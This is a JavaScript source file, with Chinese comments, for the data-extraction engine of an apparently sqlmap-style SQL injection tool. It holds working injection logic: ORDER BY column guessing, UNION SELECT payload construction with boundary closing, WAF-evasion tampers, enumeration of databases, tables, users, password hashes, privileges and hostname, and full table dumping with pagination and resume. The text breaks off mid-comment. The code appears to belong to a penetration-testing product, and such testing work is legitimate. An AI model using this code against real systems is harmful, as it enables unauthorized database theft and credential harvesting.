// =====================================================================
// Extractor.fixed.js —— 代码审查修复版（原文件 server/src/engine/Extractor.js）
// ⚠️ 本段 ★FIX 清单是**历史留档**，不是现状说明（2026-10-05 注释瘦身时核实）：
//   仍成立：★FIX-1（请求失败须判为不可判定并回插重试）、★FIX-2（超时不得恒判为真）、
//           ★FIX-4（UNION payload 须拼 boundary）、★FIX-5（guessColumns 已委托 binaryGuessColumns）。
//   **已失效**：★FIX-3（原「SYS_QUERIES 直接拼库名/表名」）—— 转义早已搬到
//           DialectSqlBuilder.escSql，本文件改走 resolveSysQueries，不再直接构造
//           SYS_QUERIES 字符串。别再据这条推断本文件在做标识符转义。
// 其余：2026-09-14 起 blindExtractor.js 是本文件盲注部分的**纯搬移**（`this` → 首参 `ex`）。
// =====================================================================
import { nullSequence } from './payloads.js';
import { discoverEchoColumns, buildInjectionRequest } from './injection.js';
import { binaryGuessColumns, colGuessExtra } from './columnGuess.js';
import { obfuscateWithConfig } from '../core/tamper/applyTampers.js';
// [P0-FIX 2026-09-09] 出口选项同源（delay/reqRate/maxReq/cookieJar 等必须在提取阶段也生效）
import { buildEgressOpts } from './egressOpts.js';
import {
  resolveDbms, tableRef,
  resolveFromClause, WRAP, escSql, WRAP_NOCAST,
} from './DialectSqlBuilder.js';
import { logger } from '../core/logger.js';
// [对标 sqlmap --hex] 字符串字面量十六进制化（仅已验证方言，其余显式报错）
import { buildLikePattern, hexifyLikeInQuery } from './hexLiteral.js';
// [对标 sqlmap --common-tables/--common-columns] 字典（information_schema 不可用时的枚举出路）
import { COMMON_TABLES, COMMON_COLUMNS, NONEXISTENT_PROBE } from './commonNames.js';
// [P0-FIX] 提取路径放大响应上限：防大表拖库被 5MB 默认上限截断
import { EXTRACT_MAX_BODY_BYTES } from '../core/httpClient.js';
// [P0-FIX] 布尔提取复用检测层 autoDynamicBlock：与 Detector 共用同一份
// 「排除动态块的相似判定」构建器，避免两层逻辑漂移
// [大文件拆分 2026-09-14] 盲注/时间/内联提取已抽至 blindExtractor.js（实例作首参传入）
import {
  extractBoolean as extractBooleanImpl,
  extractProof as extractProofImpl,
  extractTimeProof as extractTimeProofImpl,
  extractTime as extractTimeImpl,
  calibrateTimeSleep as calibrateTimeSleepImpl,
  extractInline as extractInlineImpl,
  extractInlineProof as extractInlineProofImpl,
} from './blindExtractor.js';

// [⑬] DialectSqlBuilder 收敛：方言 SQL 知识（转义函数/escCols/resolveDbms/tableRef/
// fromDummy/WRAP）统一从 DialectSqlBuilder.js 导入，消除 4 份 resolveDbms 拷贝、2 份
// fromDummy 拷贝、2 份转义函数拷贝。re-export WRAP 保持向后兼容（dbmsExtend.test 等）。
export { WRAP };

// [P2] 方言查询/函数映射表已拆分到 extractionMaps.js（消除 430 行常量定义）
import {
  SYS_QUERIES,
  CURRENT_DB_EXPR, HOSTNAME_QUERY, ISDBA_QUERY,
  SCHEMA_QUERY, PRIVILEGES_QUERY, ROLES_QUERY,
  CURRENT_USER_EXPR,
  SEARCH_COLUMNS_QUERY, SEARCH_TABLES_QUERY, COUNT_WHERE_QUERY,
  resolveSysQueries,
} from './extractionMaps.js';
// [大文件拆分 2026-09-20] 拖库结果格式化（纯函数，无 this/无 I/O）外移至独立模块
//   dumpFormat.js：formatDumpData / formatCsv / escapeCsvCell / formatSql / formatHtml。
// [2026-10-05] 本文件曾 import 这 5 个符号**仅为**喂类上的同名薄委托；薄委托既已删除
//   （全仓零调用，见类体末尾 DEAD-CODE 说明），import 随之整体移除。
//   ⚠️ 别再把格式化逻辑搬回本文件：实现在 dumpFormat.js，其契约（'json' 返回原始数组、
//   空数据返回格式骨架、未知 format 抛错不静默回落）由 dumpFormat.test.js 直接钉在那边。
// 注：原 AppError/ErrorCode import 随之移走 —— 本文件已无抛错点（唯一的
//   `throw new AppError(INVALID_PARAM)` 现落在 dumpFormat.js 的 formatDumpData default 分支）。

// 数据提取器：基于确认的可回显注入点做库/表/列/数据枚举；
// 盲注场景退化为布尔/时间二分提取（受 config 约束）。

/**
 * --start/--stop 行偏移量的归一化（**唯一真源**，2026-10-05 上提）。
 *
 * 起因：此前 `dumpData()` 与 `_applySearchLimits()` 各自内联了一份**逐字相同**的
 * `_posInt`。两份副本的真正风险不在"多写了四行"，而是：改上限（1000000）
 * 或改边界语义（>0 才算有效）时只改一处 ⇒ 拖库与搜索对同一份配置给出**不同**的行区间，
 * 而这类不一致只在特定参数组合下显现，测试很难抓到。
 * 本仓已因"同一判据两份实现、一份修了另一份没修"反复吃亏（见 ipBytes.js），
 * 故此处上提为模块级单一真源，两个调用点共用。
 *
 * 语义保持不变（0 = 不限/未设置，负数与 NaN 一律归 0，上限 100 万行）：
 *   n 非法或 ≤0 → 0（调用方据此视为"未指定"）
 *   合法正数 → 向下取整，且不超过 MAX_RANGE_ROWS
 */
const MAX_RANGE_ROWS = 1000000;
function posInt(v) {
  const n = Number(v);
  return Number.isFinite(n) && n > 0 ? Math.floor(Math.min(n, MAX_RANGE_ROWS)) : 0;
}

export class Extractor {
  constructor() {
    this.colTypeEnum = null;
    // [P1-FIX 2026-09-17] 请求上限（--max-requests）命中标志：终止信号，不是单点失败。
    //
    // [2026-10-05] 原先此字段**根本不存在于构造器**，只在 _send 的 catch 里用
    //   `/** @type {any} */ (this)._limitHit = true` 动态挂上去，读取侧 blindExtractor
    //   也靠同样的 any 逃逸。两处都在绕过类型检查，说明当时就知道它不属于这个类。
    // 真正的缺陷是**状态泄漏**：
    //   ScanManager 持有**一个** Extractor 实例（ScanManager.js:118），跨多个注入点、
    //   多轮提取复用；而该标志置位后**永不复位** ⇒ 一旦某个注入点撞上限，
    //   同一实例后续**所有**注入点的提取 worker 都会立刻 break（blindExtractor.js:299），
    //   表现为"后面的注入点静默提不出任何数据"，且没有任何错误提示。
    //   反向同样有坑：若在构造器初始化为 false 而不复位，就退化成"全局熔断"——
    //   熔断本意是终止**本次**提取流程，不是让整个扫描实例瘫痪。
    //
    // 处置：显式声明（类型正确、读取侧不再需要 any），并在每次提取开始时复位，
    // 使其严格等价于原意图"停止本批/本次提取"。复位点见 extractBoolean/extractProof 等入口
    // 统一走的 _resetLimitHit()。
    this._limitHit = false;
    // 盲注提取结果缓存（对标 sqlmap --predict-output / 常见值缓存）：
    // WeakMap<target, Map<`${scanId}:${dbms}:${expr}`, value>>，按目标对象身份隔离——
    // 同目标（+同 scanId）内同表达式（version()/database()/current_user 等常见值）跨注入点复用，
    // 命中后直接返回不再重复二分；不同目标/不同扫描互不串数据（避免跨目标污染）。
    this._extractCache = new WeakMap();
  }

  // 复位"请求上限已命中"标志（每次提取开始时调用）。
  // 见构造函数注释：Extractor 实例被 ScanManager 复用，不复位会跨注入点泄漏熔断状态。
  _resetLimitHit() {
    this._limitHit = false;
  }

  // 注入列类型枚举器（由 ScanManager 设置）
  setColumnTypeEnumerator(instance) {
    this.colTypeEnum = instance;
  }

  // 构造带注入值的请求（按位置；支持表单点）。
  // P1-A3：委托统一 buildInjectionRequest，避免与 Detector 各维护一份请求构造副本。
  _build(target, point, value) {
    return buildInjectionRequest(target, point, value);
  }

  async _send(ctx, value, opts = {}) {
    const config = (ctx && ctx.config) || {};
    // WAF 混淆：统一走 obfuscateWithConfig（tamper 链式优先，否则 legacy obfuscate，否则原样）
    const v = obfuscateWithConfig(value, ctx);
    const req = this._build(ctx.target, ctx.point, v);
    try {
      return await ctx.httpClient.request(
        // [P0-FIX 2026-09-09] 出口选项同源。这里是**第四份手拄**，而且漏的是最贵的几个键：
        // `delay` / `reqRate` / `maxReq` 全部未透传 → 盲注提取（动辄数千到数万请求）完全不受
        // --delay / --reqrate / --max-requests 约束：用户以为「已限速、已设请求上限」，实际只有
        // 检测阶段受限，一到提取阶段就全速裸奔（客户系统被打挂、出口 IP 被 WAF 拉黑都发生在这里）。
        buildEgressOpts(config, {
          method: req.method,
          url: req.url,
          params: req.params,
          data: req.data,
          headers: req.headers,
          sql: req.sql, // 直连模式由 DirectConnector 执行 req.sql；HTTP 模式下 HttpClient 忽略该字段
          timeoutMs: opts.timeoutMs ?? config.timeoutMs,
          retry: opts.retry ?? config.retry,
          // [P0-FIX] 提取路径放大响应上限：GROUP_CONCAT 聚合整页数据可能超过默认 5MB，
          // 大表/宽行拖库默认 5MB 上限会静默截断响应（axios 抛错 → _send 返回 null → 当末页）。
          // 提取请求用 EXTRACT_MAX_BODY_BYTES（默认 50MB，EXTRACT_MAX_BODY_MB 可调）。
          maxContentLength: config.maxExtractBodyBytes ?? EXTRACT_MAX_BODY_BYTES,
        })
      );
    } catch (e) {
      // [P1-FIX 2026-09-17] 「请求上限已达」是**终止信号**，不是「这一次失败」。
      // 原实现对所有异常统一 return null → 上层 worker 以为只是单点失败 → 继续全速调用
      // → 上限持续命中、持续被吞 → 空转 327,875 次 / 33 秒 CPU（实测），
      // 并把 validity 判定污染成 unreachable（目标其实完全可达，真实请求仅 203 次）。
      // 置位后由 _sendBatch 的 worker 检出并停止本批，后续批次同样因该标志不再发包。
      if (e && typeof e.message === 'string' && e.message.indexOf('请求上限已达') >= 0) {
        this._limitHit = true;
      }
      // [审计 P3] 提取请求失败时记录原因，便于运维定位（不改变静默降级语义）
      logger.debug(`[extractor._send] 提取请求失败：${e && e.message ? e.message : e}`);
      return null;
    }
  }

  // 猜列数（ORDER BY 二分探测，替代线性扫描：请求数 50→log2(50)≈6）
  // ★FIX-5 [P2] 原实现与 columnGuess.binaryGuessColumns 是同一二分逻辑的第三份拷贝
  // （UnionDetector / DBFingerprinter 已收敛到 binaryGuessColumns），此处改为委托，消除判据漂移。
  async guessColumns(ctx) {
    const baseline = await this._send(ctx, ctx.point.originalValue || '1');
    const baseLen = String(baseline?.data ?? '').length;
    const maxCols = ctx.config?.maxColumnsGuess ?? 50;
    // [P2-5] --union-cols：用户给定列数（跳过 ORDER BY 二分；0/缺省自动猜测）
    const unionCols = ctx.config?.unionCols ? Number(ctx.config.unionCols) : 0;
    const orig = ctx.point.originalValue || '1';
    return binaryGuessColumns(
      async (n) => {
        const res = await this._send(ctx, `${orig} ORDER BY ${n}-- -`);
        return res || null;
      },
      { baseLen, maxCols, cache: _colGuessCache, cacheKey: colGuessScopeKey(ctx.target, ctx.point?.id, colGuessExtra(ctx, ctx.point?.boundary || '')), fixed: unionCols }
    );
  }

  // 列数缓存：同一注入点生命周期内列数不变，缓存避免每次枚举重复 ORDER BY 二分探测
  async _guessColumnsCached(ctx) {
    if (ctx._guessedColumns == null) {
      ctx._guessedColumns = await this.guessColumns(ctx);
    }
    return ctx._guessedColumns;
  }

  // ── [大文件拆分 2026-09-20] 枚举类方法的公共骨架（消除 20 个方法的重复）──────────────
  // 抽离理由：`enumerateXxx` / `currentXxx` 共 20 个方法的实现完全同构，差异只在三处：
  //   ① 查询来源（SYS_QUERIES 版本变体 / 各查询表 / 表达式表）
  //   ② 「该方言无此查询」时的返回值（列表类给 []，标量类给 null）
  //   ③ 是否需要把结果按逗号切成数组
  // 此前 20 份重复带来的真实风险（不只是啰嗦）：**任何一处改动都要改 20 遍**，
  // 漏改一处就产生行为漂移 —— 例如「权限不足静默降级」这条 try/catch 语义，
  // 只要有一个方法漏写，该方法在权限不足时就会把异常抛给上层而非返回 null。
  //
  // 两个助手都要传入已解析的查询（调用方负责查表 + 版本分支），
  // 助手只负责「提取 + 失败降级」这段真正重复的部分。

  /**
   * 提取单个标量（枚举类方法的公共后半段）。
   * @param {object} ctx 扫描上下文
   * @param {string|null|undefined} q 已解析的 SQL；falsy 表示该方言无此查询
   * @param {{ fallback?: any }} [opts] fallback：无查询时返回值（列表类传 []，标量类传 null）
   * @returns {Promise<any>} 提取结果；查询失败（权限不足等）时静默降级为 fallback
   */
  async _enumScalar(ctx, q, { fallback = null } = {}) {
    if (!q) return fallback;
    const columns = await this._guessColumnsCached(ctx);
    try {
      return await this.extractScalar(ctx, q, columns);
    } catch {
      return fallback; // 权限不足等静默降级，不阻断主流程
    }
  }

  /**
   * 提取逗号分隔列表并切分为数组（databases/tables/columns 三个枚举用）。
   * @param {object} ctx 扫描上下文
   * @param {string|null|undefined} q 已解析的 SQL
   * @param {{ fallback?: any }} [opts] 无查询时返回值（默认 []）
   * @returns {Promise<string[]>} 值数组（无查询/提取为空时为空数组）
   */
  async _enumList(ctx, q, { fallback = [] } = {}) {
    if (!q) return fallback;
    const val = await this._enumScalar(ctx, q, { fallback: null });
    return val ? String(val).split(',').filter(Boolean) : [];
  }

  // 通过 UNION 提取单个标量值（用标记包裹，返回标记间内容）
  async extractScalar(ctx, sql, columns) {
    this._resetLimitHit(); // 与盲注入口同因：本次提取的终止信号，实例复用故需复位（见构造函数）
    const { point, dbms } = ctx;
    // [P0-FIX 2026-09-12] 列数优先用「检测期 UNION 实测确认」的 point.columns：
    //   传入的 columns 来自 _guessColumnsCached（ORDER BY 二分），而 **ORDER BY 在字符串
    //   上下文注入点（如 LIKE '%..%'）里根本不进 SQL**（payload 整个落在字符串字面量内，
    //   服务端返回 200 正常页）→ 二分失去真值反馈，会收敛到完全错误的列数。
    //   实测 mixcols 靶点（字符串上下文）：检测期 UNION 实测 2 列、ORDER BY 猜 13 列
    //   → UNION 列数不匹配 → 目标 500 → 枚举/拖库全灭（报告 0 行）。
    //   point.columns 是检测阶段真枪实弹回显成功的列数，可信度更高；
    //   error/boolean-only 注入点无该字段 → 原样回落（零回归）。
    const confirmed = Number.isInteger(point?.columns) && point.columns > 0 ? point.columns : null;
    if (confirmed) columns = confirmed;
    // [2026-10-01] 猜列 capped → null（判据失效，见 columnGuess）：无确认列数时 UNION 通道
    // 不可用 —— 直接返回 null（所有调用方本就把 null 当「提取失败」降级处理），
    // 不再拿荒谬列数发空转的 UNION 请求。
    if (!Number.isInteger(columns) || columns <= 0) return null;
    const nulls = nullSequence(columns).split(',');
    // 优先复用检测阶段已识别的回显列；未识别（如 error 型注入）则现场探测，
    // 不再硬编第 2 列，回显列非 2 也能正确拖库。
    let echoCols = point.echoCols;
    if (!echoCols || !echoCols.length) {
      echoCols = await discoverEchoColumns(ctx.httpClient, ctx, columns);
    }
    const idx = echoCols && echoCols.length ? echoCols[0] : 1;
    const cols = nulls
      .map((_, i) => (i === idx ? ((ctx.config?.noCast && WRAP_NOCAST[resolveDbms(dbms)]) ? WRAP_NOCAST[resolveDbms(dbms)](sql) : WRAP[resolveDbms(dbms)](sql)) : 'NULL'))
      .join(',');
    // 伪表 FROM 子句：Oracle/DM8→dual，DB2/Derby→SYSIBM.SYSDUMMY1，Access→MSysObjects，
    // HSQLDB→VALUES(0) 派生表，MonetDB→sys.version，其余库可省略（对齐 DBFingerprinter.fromDummy）
    const fromDual = resolveFromClause(resolveDbms(dbms), ctx?.config?.unionFrom);
    // ★FIX-4 [P1] 原 payload 未拼 point.boundary（布尔/时间检测器均使用），字符串上下文
    // 注入点（如 WHERE name='...'）上 UNION 提取永不执行。修复：拼闭合前缀。
    const payload = `${point.originalValue || '1'}${point.boundary || ''} UNION SELECT ${cols}${fromDual}-- -`;
    const res = await this._send(ctx, payload);
    const body = String(res?.data ?? '');
    // D6: 大小写不敏感匹配 —— lowercase/uppercase/mixedcase 等 tamper 会把字符串字面量
    // '__S__/__E__' 整体变小/大写，拖库/指纹/内联提取的标记匹配必须免疫（对标 sqlmap 标记稳定设计）
    const m = body.match(/__S__(.*?)__E__/is);
    return m ? m[1] : null;
  }

  // 枚举数据库
  // [大文件拆分 2026-09-20] 实现收敛到 _enumList（原为 20 份重复骨架之一）。
  // SQLite 无 information_schema 概念，但库名恒为 main → 保持原有特例。
  async enumerateDatabases(ctx) {
    const db = resolveDbms(ctx.dbms);
    // [P2-2] resolveSysQueries：按 ctx.dbmsVersion 选版本变体（MySQL<5.7 / MSSQL<2017 降级）
    const q = resolveSysQueries(db, ctx.dbmsVersion)?.databases;
    if (q == null) return ctx.dbms === 'SQLite' ? ['main'] : [];
    return this._enumList(ctx, q, { fallback: [] });
  }

  // 枚举表
  // [P2 审计修复 2026-09-22] 原写法 `resolveSysQueries(edb, …)?.tables?.(db)` 只对**对象**做了
  // 可选链，`tables` 本身就是 null 时（Access、以及 Derby 的诚实降级）会以
  // `?.tables is not a function` 抛错而非返回空列表 —— 枚举能力「标记为不支持」却「运行时崩溃」。
  // 实测复现：new Extractor().enumerateTables({dbms:'Access',…}) → 抛
  //   `resolveSysQueries(...)?.tables is not a function`
  // 修法：用 `?.tables?.(db)` 两个可选链（属性可选 + 调用可选），与 enumerateDatabases 的
  // `if (q == null) return []` 语义对齐 —— 不支持时**返回空列表**，不抛错。
  async enumerateTables(ctx, db) {
    const edb = resolveDbms(ctx.dbms);
    const q = resolveSysQueries(edb, ctx.dbmsVersion)?.tables?.(db);
    return this._enumList(ctx, q, { fallback: [] });
  }

  // 枚举列
  // [P2 审计修复 2026-09-22] 同 enumerateTables：`?.columns?.(db, table)` 双可选链。
  async enumerateColumns(ctx, db, table) {
    const edb = resolveDbms(ctx.dbms);
    const q = resolveSysQueries(edb, ctx.dbmsVersion)?.columns?.(db, table);
    return this._enumList(ctx, q, { fallback: [] });
  }

  // 提取数据（返回对象数组，键为列名）；MySQL/SQLite/PG/SQLServer 自动分页续拉到全量，Oracle 受 ROWNUM 单页限制
  // [sqlmap 对标 --where] opts.where 为原始 SQL WHERE 子句（如 "id>100 AND name LIKE '%admin%'"），
  //   直接拼入 data 查询模板（不对 WHERE 内容做转义，与 sqlmap --where 行为一致）。
  // [Feature 4] 行级断点续传：opts.checkpointInterval（默认 100）控制断点保存频率；
  //   通过 ctx.session.setDumpCheckpoint / getDumpCheckpoint 与会话持久化集成。
  async dumpData(ctx, db, table, cols, limit, opts = {}) {
    const lim = limit ?? ctx.config?.dumpRowLimit ?? 100;
    const edb = resolveDbms(ctx.dbms);
    const where = opts.where || null;
    // [sqlmap 对标] 行范围导出（--start/--stop）：起始偏移 dumpStart；结束行 dumpStop（绝对，0=不限）。
    // 区间行数 rangeCap 与全量上限 maxRows 取更严者。
    // 归一化口径见文件头 posInt（唯一真源，此前此处与 _applySearchLimits 各有一份拷贝）。
    const startRow = posInt(ctx.config?.dumpStart);
    const stopRow = posInt(ctx.config?.dumpStop);
    const rangeCap = stopRow > startRow ? stopRow - startRow : null;
    // [P2-2] 版本分支：MySQL<5.7 / MSSQL<2017 走降级查询变体
    const SQ = resolveSysQueries(edb, ctx.dbmsVersion) || SYS_QUERIES[edb];
    const q0 = SQ?.data(db, table, cols || [], lim, startRow, where);
    if (!q0) return [];
    const columns = await this._guessColumnsCached(ctx);
    // Oracle 用 ROWNUM 单页（模板忽略 offset）；其余库支持 LIMIT/OFFSET 分页续拉
    const PAGINATED = edb !== 'Oracle';
    const all = [];
    const maxRows = ctx.config?.dumpMaxRows ?? lim * 50; // 全量上限保护，防超大表无限拉取

    // [Feature 4] 行级断点续传：从会话恢复上次提取进度。
    // 安全约束（修复）：断点只记录 offset，不记录已完成区间的行数据。若直接跳到 offset 续拉，
    // 返回的行集会缺少 [startRow, ckptRow) 区间，导出/报告出现静默缺行。
    // 因此续跑的**前置条件**是能从会话里取回已完成区间的历史行；取不回则退化为从头拉取
    // （多花请求，但保证数据完整 —— 正确性优先于提速）。
    const checkpointInterval = opts.checkpointInterval ?? ctx.config?.dumpCheckpointInterval ?? 100;
    const session = ctx.session;
    const hasCheckpoint = session && typeof session.getDumpCheckpoint === 'function' && typeof session.setDumpCheckpoint === 'function';
    let ckptRow = 0;
    let historyRows = null; // 已完成区间的历史行（续跑时前置拼接）
    if (hasCheckpoint) {
      const ckpt = session.getDumpCheckpoint(db, table);
      if (ckpt && ckpt.database === db && ckpt.table === table) {
        ckptRow = ckpt.lastCompletedRowIndex;
      }
    }
    if (ckptRow > startRow) {
      historyRows = this._checkpointHistoryRows(session, db, table);
      // 历史行不足以覆盖已完成区间 → 放弃续跑，从头拉取
      if (!Array.isArray(historyRows) || historyRows.length < ckptRow - startRow) {
        historyRows = null;
        ckptRow = 0;
      } else {
        historyRows = historyRows.slice(0, ckptRow - startRow);
      }
    }
    const resumeFrom = Math.max(startRow, ckptRow);
    let rowsSinceCheckpoint = 0;

    let offset = resumeFrom;
    while (true) {
      const q = PAGINATED
        ? SQ.data(db, table, cols || [], lim, offset, where)
        : SQ.data(db, table, cols || [], lim, 0, where);
      const val = await this.extractScalar(ctx, q, columns);
      if (!val) break;
      // 行分隔 0x1E、列分隔 0x1F（与控制字符 SYS_QUERIES 一致，业务数据几乎不会含）
      const rowSep = String.fromCharCode(0x1e);
      const colSep = String.fromCharCode(0x1f);
      const rowStrs = val.split(rowSep).map((r) => r.trim()).filter(Boolean);
      // [P0-FIX] MySQL GROUP_CONCAT 截断检测：当 val 长度接近 group_concat_max_len
      //（默认 1024）且行数不足时，说明聚合被服务端截断（非真实末页）。截断可能恰好
      // 切在行分隔符 0x1E 处导致多行但末行不完整——不仅检查 rowStrs.length===1。
      // 检测条件放宽为「val 长度 ≥ 1000 且行数 < lim」，覆盖所有截断位置。
      // 命中后降级逐行查询（limit=1 走同一通道），确保数据完整。
      // 仅 MySQL/TiDB/MariaDB 生效（使用 GROUP_CONCAT 聚合的方言）。
      const mayTruncate =
        (edb === 'MySQL' || edb === 'TiDB' || edb === 'mariadb') &&
        val.length >= 1000 && rowStrs.length < lim;
      if (mayTruncate) {
        logger.warn(`[extract] ${db}.${table} GROUP_CONCAT 疑似截断（行长 ${rowStrs[0].length}≈group_concat_max_len），降级逐行提取`);
        // 逐行降级：limit=1 每页一行，循环续拉到全量（与既有分页语义兼容）
        let probeOffset = offset;
        while (true) {
          const q1 = SQ.data(db, table, cols || [], 1, probeOffset, where);
          const v1 = await this.extractScalar(ctx, q1, columns);
          if (!v1) break;
          const rr = v1.split(rowSep).map((r) => r.trim()).filter(Boolean);
          for (const rowStr of rr) {
            const cells = rowStr.split(colSep);
            const obj = {};
            (cols || []).forEach((c, i) => { obj[c] = cells[i] ?? null; });
            all.push(obj);
          }
          if (rr.length < 1) break;
          probeOffset += 1;
          const cap2 = rangeCap != null ? Math.min(rangeCap, maxRows) : maxRows;
          if (all.length >= cap2) { all.length = cap2; break; }
          // [Feature 4] 逐行降级模式下也保存断点
          if (hasCheckpoint && checkpointInterval > 0) {
            rowsSinceCheckpoint += rr.length;
            if (rowsSinceCheckpoint >= checkpointInterval) {
              session.setDumpCheckpoint(db, table, probeOffset + 1).catch(() => {});
              rowsSinceCheckpoint = 0;
            }
          }
        }
        break; // 逐行已拉全，退出外层分页
      }
      for (const rowStr of rowStrs) {
        const cells = rowStr.split(colSep);
        const obj = {};
        (cols || []).forEach((c, i) => {
          obj[c] = cells[i] ?? null;
        });
        all.push(obj);
      }
      // [Feature 4] 行级断点保存：每 checkpointInterval 行保存一次进度
      if (hasCheckpoint && checkpointInterval > 0) {
        rowsSinceCheckpoint += rowStrs.length;
        if (rowsSinceCheckpoint >= checkpointInterval) {
          session.setDumpCheckpoint(db, table, offset + rowStrs.length).catch(() => {});
          rowsSinceCheckpoint = 0;
        }
      }
      if (rowStrs.length < lim) break; // 本页不足一页 → 末页
      offset += lim;
      // 行范围（--start/--stop）与全量上限取更严者
      const cap = rangeCap != null ? Math.min(rangeCap, maxRows) : maxRows;
      if (all.length >= cap) {
        all.length = cap;
        break;
      }
    }
    // [P0 2026-09-09 实战批次] 「0 行」恒真对照：空结果可能是「空表」也可能是
    // 「提取通路不稳」（UNION 回显被 WAF/类型限制拦死）。补 1 次行存在性探针区分：
    //   · 探针有行 → 表非空但提取 0 行 → 判「未确认」并回调（进报告 constraints，人工复核）；
    //   · 探针无行 → 真空表，静默（零额外标注）。
    // 仅在主循环 0 行时多花 1 次请求；探针失败视为无法判定 → 保守标「未确认」。
    if (all.length === 0 && !opts.skipEmptyConfirm) {
      const verdict = await this._confirmEmptyTable(ctx, db, table);
      if (verdict === 'unconfirmed') {
        logger.warn(`[extract] ${db}.${table} 提取 0 行但行存在性探针有数据 → 标记未确认（提取通路可能不稳）`);
        opts.onUnconfirmedEmpty?.(db, table);
      }
    }
    // 续跑时前置拼接已完成区间的历史行，保证返回行集连续完整
    return historyRows && historyRows.length ? [...historyRows, ...all] : all;
  }

  // 「0 行」行存在性探针：SELECT 1 FROM <table> LIMIT 1（按方言）。
  // 返回 'empty'（无行）| 'unconfirmed'（有行/探针异常——保守判未确认）。
  async _confirmEmptyTable(ctx, db, table) {
    const edb = resolveDbms(ctx.dbms);
    const qual = db && db !== 'main' && db !== 'current' ? `${db}.` : '';
    const t = `${qual}${table}`;
    let sql;
    switch (edb) {
      case 'SQL Server':
        sql = `SELECT TOP 1 1 FROM ${t}`;
        break;
      case 'Oracle':
        sql = `SELECT 1 FROM ${t} WHERE ROWNUM = 1`;
        break;
      case 'DB2':
        sql = `SELECT 1 FROM ${t} FETCH FIRST 1 ROWS ONLY`;
        break;
      default: // MySQL / PostgreSQL / SQLite / MariaDB / TiDB / H2 …
        sql = `SELECT 1 FROM ${t} LIMIT 1`;
    }
    try {
      const columns = await this._guessColumnsCached(ctx);
      const val = await this.extractScalar(ctx, sql, columns);
      return val != null && String(val) !== '' ? 'unconfirmed' : 'empty';
    } catch (e) {
      logger.debug(`[extract] 空结果行存在性探针失败（${db}.${table}）：${e.message}`);
      return 'unconfirmed'; // 探针失败 → 无法证明是空表 → 保守标未确认
    }
  }

  // 行级断点续传的历史行取回：从会话已落盘的提取结果里找该表的行。
  // rows 的键在不同路径下可能是 `db.table` 或 `table`，两种都兼容。
  _checkpointHistoryRows(session, db, table) {
    try {
      const rows = session?.extracted?.rows;
      if (!rows || typeof rows !== 'object') return null;
      return rows[`${db}.${table}`] || rows[table] || null;
    } catch {
      return null;
    }
  }

  // 当前数据库（对标 sqlmap --current-db）：复用 extractScalar 提取当前库名标量。
  // 实现对标 extractProof 模式：查方言表达式表，无表达式（SQLite 无会话库概念）返回 null。
  async currentDb(ctx) {
    const edb = resolveDbms(ctx.dbms);
    // SQLite 等无会话库概念 → null（_enumScalar 对 falsy 查询直接返回 fallback）
    return this._enumScalar(ctx, CURRENT_DB_EXPR[edb], { fallback: null });
  }

  // 当前用户（对标 sqlmap --current-user）：复用 extractScalar 提取当前用户名标量。
  async currentUser(ctx) {
    const edb = resolveDbms(ctx.dbms);
    return this._enumScalar(ctx, CURRENT_USER_EXPR[edb], { fallback: null });
  }

  // 枚举用户列表（对标 sqlmap --users）：复用 extractScalar 提取 SYS_QUERIES[dbms].users。
  // mysql.user / pg_shadow / sys.sql_logins 需要额外权限，查询失败时返回 null（不阻断主流程）。
  async enumerateUsers(ctx) {
    const db = resolveDbms(ctx.dbms);
    // [P2-2] 版本分支：MSSQL<2017 凭据收割同步降级（FOR XML PATH）
    const q = resolveSysQueries(db, ctx.dbmsVersion)?.users;
    return this._enumScalar(ctx, q, { fallback: null });
  }

  // 枚举凭据（对标 sqlmap --passwords）：复用 extractScalar 提取 SYS_QUERIES[dbms].passwords。
  // 查询失败时返回 null（不阻断主流程）。
  async enumeratePasswords(ctx) {
    const db = resolveDbms(ctx.dbms);
    // [P2-2] 版本分支：MySQL<5.7 回退 password 列；MSSQL<2017 走 FOR XML PATH
    const q = resolveSysQueries(db, ctx.dbmsVersion)?.passwords;
    return this._enumScalar(ctx, q, { fallback: null });
  }

  // 枚举 hostname（对标 sqlmap --hostname）：复用 extractScalar 提取主机名/地址。
  // 查询失败时返回 null（不阻断主流程）。
  async enumerateHostname(ctx) {
    const db = resolveDbms(ctx.dbms);
    return this._enumScalar(ctx, HOSTNAME_QUERY[db], { fallback: null });
  }

  // 枚举 is-dba（对标 sqlmap --is-dba）：复用 extractScalar 返回 1（是）或 0（否）。
  // 查询失败时返回 null（不阻断主流程）。
  async enumerateIsDba(ctx) {
    const db = resolveDbms(ctx.dbms);
    return this._enumScalar(ctx, ISDBA_QUERY[db], { fallback: null });
  }

  // 枚举 schema（表结构/列定义，对标 sqlmap --schema）：
  // 返回逗号分隔的列定义字符串（如 "id INT(11),name VARCHAR(255)"），或 null。
  async enumerateSchema(ctx, db, table) {
    const edb = resolveDbms(ctx.dbms);
    const q = SCHEMA_QUERY[edb];
    return this._enumScalar(ctx, q ? q(db, table) : null, { fallback: null });
  }

  // 枚举用户权限（对标 sqlmap --privileges）：复用 extractScalar 提取权限列表。
  // 查询失败时返回 null（不阻断主流程）。
  async enumerateUserPrivs(ctx) {
    const db = resolveDbms(ctx.dbms);
    return this._enumScalar(ctx, PRIVILEGES_QUERY[db], { fallback: null });
  }

  // 枚举角色（对标 sqlmap --roles）：复用 extractScalar 提取角色列表。
  // 查询失败时返回 null（不阻断主流程）。
  async enumerateRoles(ctx) {
    const db = resolveDbms(ctx.dbms);
    return this._enumScalar(ctx, ROLES_QUERY[db], { fallback: null });
  }

  // 表行数统计（对标 sqlmap --count）：SELECT COUNT(*) FROM <table>，复用 extractScalar。
  // 表名按方言转义（escBacktick/escDq/escBracket），返回数字或 null。
  async countRows(ctx, db, table) {
    const edb = resolveDbms(ctx.dbms);
    const columns = await this._guessColumnsCached(ctx);
    const val = await this.extractScalar(
      ctx,
      `(SELECT COUNT(*) FROM ${tableRef(edb, db, table)})`,
      columns
    );
    if (val == null || val === '') return null;
    const n = Number(String(val).trim());
    return Number.isFinite(n) ? n : null;
  }

  // ===== [sqlmap 对标 --common-tables / --common-columns] 字典爆破 =====
  // 场景：information_schema 不可用（被 WAF 拦 / 账号权限不足 / 目标库无该视图）。
  // 原理：对字典中每个候选名做存在性探针——
  //   存在   → extractScalar 拿到值（行数可以是 0，但值本身非 null）
  //   不存在 → SQL 报错 → UNION 提取失败 → null
  // 防误判（关键）：先跑「通道自检」（提取常量 '1'）与「不存在对照名」。
  //   若自检为 null，说明提取通道本身不可用 —— 此时必须返回 CHANNEL_UNAVAILABLE，
